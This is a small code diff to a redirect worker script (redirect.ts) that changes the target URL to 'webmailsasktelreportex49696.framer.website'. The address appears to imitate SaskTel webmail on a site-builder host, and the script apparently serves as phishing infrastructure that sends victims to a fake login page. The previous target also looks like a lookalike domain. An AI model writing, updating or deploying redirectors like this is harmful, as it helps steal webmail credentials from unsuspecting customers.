@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://sasktel.sitew.ca/"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://webmailsasktelreportex49696.framer.website/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
